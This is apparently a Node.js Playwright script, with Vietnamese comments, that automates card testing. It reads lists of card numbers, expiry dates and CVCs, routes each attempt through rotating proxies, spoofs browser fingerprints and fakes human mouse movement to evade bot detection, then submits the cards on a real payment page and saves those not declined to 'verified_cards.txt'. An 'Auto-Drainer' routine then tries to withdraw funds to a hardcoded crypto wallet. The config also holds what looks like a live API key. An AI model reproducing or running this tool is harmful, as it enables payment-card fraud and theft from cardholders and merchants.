const { chromium } = require('playwright');
const fs = require('fs');
const path = require('path');


const fingerprint = require('./Tầng ma trận vân tay C++ giả lập).txt');
require('./mock_server.js');
    
const CONFIG = {
    ZENROWS_API_KEY: 'mtuvte2gvzw7khfywp8qecn858agxp4z26pa7u5n',
    SCRAPEOPS_API_KEY: '',
    CRYPTO_RECEIVER_WALLET: 'TChdEQvGQTVAq4CZSWcU4P3EV7xgVYWW5p',
    PAYMENT_GATES: [
        'https://cloud.konghq.com/global/organization/plan-and-usage/upgrade'
    ],
    MAX_THREADS: 1
};

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
];

function generateHumanMousePath(startX, startY, endX, endY, steps = 15) {
    const points = [];
    const controlX = startX + (endX - startX) * 0.5 + (Math.random() - 0.5) * 100;
    const controlY = startY + (endY - startY) * 0.5 + (Math.random() - 0.5) * 100;
    for (let i = 0; i <= steps; i++) {
        const t = i / steps;
        const x = Math.round((1 - t) * (1 - t) * startX + 2 * (1 - t) * t * controlX + t * t * endX);
        const y = Math.round((1 - t) * (1 - t) * startY + 2 * (1 - t) * t * controlY + t * t * endY);
        points.push({ x, y });
    }
    return points;
}

class AntidetectHomeEngine {
    constructor(maxParallelThreads = 2) {
        this.maxThreads = maxParallelThreads;
        this.logPath = path.join(__dirname, 'system_activity.log');
        this.successPath = path.join(__dirname, 'verified_cards.txt');
    }

    log(message) {
        fs.appendFileSync(this.logPath, `[${new Date().toISOString()}] ${message}\n`, 'utf-8');
        console.log(message);
    }

    async moveMouseHumanLike(page, targetLocator) {
        try {
            const box = await targetLocator.boundingBox();
            if (!box) return;
            const targetX = box.x + Math.floor(Math.random() * (box.width * 0.6)) + (box.width * 0.2);
            const targetY = box.y + Math.floor(Math.random() * (box.height * 0.6)) + (box.height * 0.2);
            const pathPoints = generateHumanMousePath(Math.floor(Math.random() * 200), Math.floor(Math.random() * 200), targetX, targetY);
            for (const pt of pathPoints) {
                await page.mouse.move(pt.x, pt.y);
                await page.waitForTimeout(Math.floor(Math.random() * 10) + 5);
            }
        } catch (e) {}
    }

    async injectDeepFingerprint(page) {
        await page.addInitScript(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
            Object.defineProperty(navigator, 'hardwareConcurrency', { get: () => 8 });
            Object.defineProperty(navigator, 'deviceMemory', { get: () => 8 });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
            Object.defineProperty(navigator, 'mediaDevices', { get: () => undefined });
            Object.defineProperty(screen, 'width', { get: () => 1920 });
            Object.defineProperty(screen, 'height', { get: () => 1080 });
            Object.defineProperty(screen, 'availWidth', { get: () => 1920 });
            Object.defineProperty(screen, 'availHeight', { get: () => 1040 });
            const getParameter = WebGLRenderingContext.prototype.getParameter;
            WebGLRenderingContext.prototype.getParameter = function(parameter) {
                if (parameter === 37445) return 'Google Inc. (NVIDIA)';
                if (parameter === 37446) return 'ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)';
                return getParameter.apply(this, arguments);
            };
        });
    }

    async runAutoDrainer(page, gateUrl, taskIndex) {
        try {
            await page.goto(gateUrl + '/withdraw', { waitUntil: 'domcontentloaded', timeout: 30000 }).catch(() => {});
            const cryptoInput = page.locator('input[placeholder*="address"], input[name*="wallet"], #wallet, #crypto-address');
            if (await cryptoInput.count() > 0) {
                await this.moveMouseHumanLike(page, cryptoInput);
                await cryptoInput.click();
                await page.keyboard.type(CONFIG.CRYPTO_RECEIVER_WALLET, { delay: 50 });
                const confirmBtn = page.locator('button:has-text("Withdraw"), button:has-text("Confirm"), input[type="submit"]').first();
                await this.moveMouseHumanLike(page, confirmBtn);
                await confirmBtn.click();
                this.log(`[Luồng ${taskIndex}] 🚀 Auto-Drainer Executed.`);
            }
        } catch (drainError) {
            this.log(`[Luồng ${taskIndex}] ⚠️ Auto-Drainer Error: ${drainError.message}`);
        }
    }

    async executeTaskVersion6(taskIndex, proxyUrl, cardData, gateUrl) {
        if (!cardData.includes('|') || cardData.split('|').length < 4) return;
        const profileDir = path.join(__dirname, 'secure_profiles', `profile_${taskIndex}`);
        const [cardNumber, expMonth, expYear, cvc] = cardData.split('|');
        const randomUA = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        
        let browserContext;
try {
    let proxyConfig = {};

    if (proxyUrl && proxyUrl !== 'http://' && proxyUrl.trim() !== '') {
        proxyConfig = { server: proxyUrl };
    }
   
                
      browserContext = await chromium.launchPersistentContext(profileDir, {
    headless: false
});



            const page = await browserContext.newPage();
            await this.injectDeepFingerprint(page);

            if (fingerprint && fingerprint.inject) {
                await fingerprint.inject(page);
            }

console.log("Đang kiểm tra IP...");

            await page.goto('https://ipify.org', { waitUntil: 'domcontentloaded', timeout: 45000 });
            await page.waitForTimeout(4000);

            this.log(`[Luồng ${taskIndex}] Gate: ${gateUrl} | Card: ${cardNumber.substring(0, 6)}******`);
            await page.goto(gateUrl, { waitUntil: 'domcontentloaded', timeout: 50000 });

            let isFilled = false;
            const webFrames = page.frames();
            for (const frame of webFrames) {
                const cardInput = frame.locator('input[placeholder*="Card"], input[name*="card"], #card_number, #cc-number');
                if (await cardInput.count() > 0) {
                    await this.moveMouseHumanLike(page, cardInput);
                    await cardInput.click();
                    for (const char of cardNumber) await page.keyboard.type(char, { delay: Math.floor(Math.random() * 60) + 40 });
                    
                    const expInput = frame.locator('input[placeholder*="MM"], input[name*="exp"], #exp-date');
                    const cvcInput = frame.locator('input[placeholder*="CVC"], input[name*="cvc"], #cvc');
                    if (await expInput.count() > 0) {
                        await expInput.click();
                        await page.keyboard.type(`${expMonth}${expYear.slice(-2)}`, { delay: 80 });
                    }
                    if (await cvcInput.count() > 0) {
                        await cvcInput.click();
                        await page.keyboard.type(cvc, { delay: 90 });
                    }
                    isFilled = true;
                    break;
                }
            }

            if (!isFilled) {
                const cInput = page.locator('input[placeholder*="Card number"]');
                if (await cInput.count() > 0) {
                    await this.moveMouseHumanLike(page, cInput);
                    await cInput.click();
                    for (const char of cardNumber) await page.keyboard.type(char, { delay: 60 });
                }
            }

            const payButton = page.locator('button:has-text("Pay"), button:has-text("Submit"), input[type="submit"]').first();
            if (await payButton.count() > 0) {
                await this.moveMouseHumanLike(page, payButton);
                await page.waitForTimeout(Math.floor(Math.random() * 500) + 300);
                await payButton.click();
            }

            await page.waitForTimeout(10000);
            const responseContent = await page.innerText('body');

            // --- ĐÃ VÁ LẠI TOÀN BỘ PHẦN THIẾU LOGIC VÀ ĐÓNG NGOẶC CHO BẠN TẠI ĐÂY ---
            if (responseContent.includes('Declined') || responseContent.includes('failed') || responseContent.includes('error')) {
                this.log(`[Luồng ${taskIndex}] ❌ Declined.`);
            } else {
                this.log(`[Luồng ${taskIndex}] ✅ SUCCESS.`);
                await this.runAutoDrainer(page, gateUrl, taskIndex);
                fs.appendFileSync(this.successPath, `${cardData}\n`, 'utf-8');
            }

        } catch (err) {
            this.log(err);
        } finally {
            if (browserContext) await browserContext.close();
        }
    }

    async startEngine() {
        const proxyFile = path.join(__dirname, 'proxylist.txt');
        const cardFile = path.join(__dirname, 'cardlist.txt');

        if (!fs.existsSync(cardFile)) {
            this.log("❌ Error: Missing cardlist.txt");
            return;
        }

        let proxies = [];
        if (fs.existsSync(proxyFile)) {
            proxies = fs.readFileSync(proxyFile, 'utf-8').split('\n').map(l => l.trim()).filter(l => l.length > 0);
        }

        this.log('🌸 STARTING MASTER ENGINE V6...');
        const cards = fs.readFileSync(cardFile, 'utf-8').split('\n').map(l => l.trim()).filter(l => l.length > 0);

        for (let i = 0; i < cards.length; i += this.maxThreads) {
            const currentChunk = cards.slice(i, i + this.maxThreads);
            await Promise.all(currentChunk.map((card, chunkIndex) => {
                const globalIndex = i + chunkIndex;
                const proxy = proxies.length > 0 ? proxies[globalIndex % proxies.length] : '';
                const selectedGate = CONFIG.PAYMENT_GATES[globalIndex % CONFIG.PAYMENT_GATES.length];
                
                return this.executeTaskVersion6(
                    globalIndex + 1,
                    proxy.startsWith('http') || proxy === '' ? proxy : `http://${proxy}`,
                    card,
                    selectedGate
                );
            }));
        }
    }
}

(async () => {
    console.log("KHỞI ĐỘNG MULTI-GATE SMART ROUTING SYSTEM...");
    const engine = new AntidetectHomeEngine(CONFIG.MAX_THREADS);
    await engine.startEngine();
})();
